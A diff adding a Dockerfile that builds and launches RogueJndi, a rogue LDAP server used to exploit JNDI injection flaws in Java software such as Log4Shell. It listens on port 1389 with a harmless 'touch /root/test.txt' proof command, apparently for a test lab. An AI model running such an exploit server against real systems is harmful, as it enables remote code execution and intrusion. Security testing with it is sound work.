@@ -1,0 +1,10 @@
+FROM maven:3.8.4-jdk-8 AS builder
+COPY . /data
+WORKDIR /data
+RUN mvn package
+
+FROM openjdk:8u181-jdk-alpine
+EXPOSE 1389
+RUN mkdir /app
+COPY --from=builder /data/target/*.jar /app/
+CMD ["java", "-jar", "/app/RogueJndi-1.1.jar", "-n","0.0.0.0","--command","touch /root/test.txt"]
